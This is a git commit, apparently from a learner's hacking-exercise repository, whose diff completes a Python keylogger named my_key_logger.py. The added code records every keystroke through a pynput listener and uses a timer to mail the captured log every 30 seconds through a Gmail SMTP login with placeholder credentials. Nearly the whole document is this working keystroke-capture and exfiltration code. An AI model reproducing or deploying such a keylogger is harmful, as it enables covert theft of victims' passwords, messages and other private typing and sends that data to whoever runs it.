f826345df29fbd374d49755f9cf888070eda180c
Ebubekir Dogan <ebubekir.dogan@bil.omu.edu.tr>
2022-06-25 17:31:12 +0300

    key logger finished

--- 9-Key-Logger/my_key_logger.py
+++ 9-Key-Logger/my_key_logger.py
@@ -1,6 +1,8 @@
 import pynput.keyboard
+import smtplib
+import threading
 
-log =""
+log = ""
 
 def callback_function(key):
     global log
@@ -17,9 +19,24 @@ def callback_function(key):
 
     print(log)
 
-key_logger_listener = pynput.keyboard.Listener(on_press=callback_function)
+def send_email(email,password,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login(email,password)
+    email_server.sendmail(email,email,message)
+    email_server.quit()
 
-#threading
+#thread - threading
 
-with key_logger_listener:
-    key_logger_listener.join()
+def thread_function():
+    global log
+    send_email("user@gmail.com", "password", log.encode('utf-8'))
+    log = ""
+    timer_object = threading.Timer(30,thread_function)
+    timer_object.start()
+
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+with keylogger_listener:
+    thread_function()
+    keylogger_listener.join()
+
